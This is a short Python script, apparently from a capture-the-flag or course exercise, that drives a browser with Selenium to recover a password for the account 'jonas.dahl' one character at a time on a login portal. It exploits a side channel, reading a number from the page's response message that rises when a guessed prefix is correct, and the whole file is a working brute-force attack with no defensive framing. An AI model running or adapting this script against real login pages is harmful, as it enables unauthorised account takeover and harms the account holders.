import string
import time
import math
from selenium import webdriver
from selenium.webdriver.common.by import By
import re


def password_finder(input_username, password_length):
    all_characters = string.printable
    password_characters = [char for char in all_characters]

    total_time = 1
    correct_password = ""           # Will fill up with the correct characters
    filler_password = ""            # Will decrease as correct characters are found, appended on correct_password

    for i in range(password_length-1):
        filler_password += "a"

    for i in range(password_length):
        for character in password_characters:
            password_to_check = correct_password + character + filler_password
            time_check = find_number_from_password_check(input_username, password_to_check)
            if time_check > total_time:
                # Correct character!
                correct_password += character
                filler_password = filler_password[1:]
                total_time += 1
                break
        print(correct_password)


def find_number_from_password_check(input_username, input_password):
    driver = webdriver.Chrome()

    driver.get('https://portal.regjeringen.uiaikt.no/')  # digkala login page

    username_field = driver.find_element(By.NAME, 'username')
    username_field.send_keys(input_username)

    password_field = driver.find_element(By.NAME, 'password')
    password_field.send_keys(input_password)

    login_button = driver.find_element(By.XPATH, '//button[@type="submit" and contains(@class, "btn-primary")]')
    login_button.click()

    time.sleep(0.5)

    response_message = driver.find_element(By.ID, 'responseMessage').text
    # print(f"Response Message 1 : {response_message}")



    return find_number_in_string(response_message)


def find_number_in_string(input_string):
    # Define a regex pattern to match numbers
    number_pattern = re.compile(r'\d+')

    # Use findall to find all occurrences of numbers in the string
    numbers_found_array = number_pattern.findall(input_string)
    number_found_string = numbers_found_array[0]
    number_found = int(number_found_string)

    return number_found


password_finder("jonas.dahl", 17)
